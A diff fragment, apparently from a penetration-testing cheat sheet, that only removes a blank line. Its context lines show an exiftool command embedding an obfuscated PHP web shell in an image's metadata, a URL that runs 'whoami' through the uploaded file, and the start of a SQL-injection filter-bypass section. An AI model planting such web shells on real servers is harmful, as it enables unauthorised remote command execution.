@@ -767,7 +767,6 @@ exiftool -Comment="<?php $b0=$_GET[base64_decode('b2s=')];if(isset($b0)){echo ba
 2.  
 https://site.com/upload/ok.jpg.php?ok=whoami
 
-
 ## SQL Injection
 ### WAF and Filter Bypass
 #### Query default:
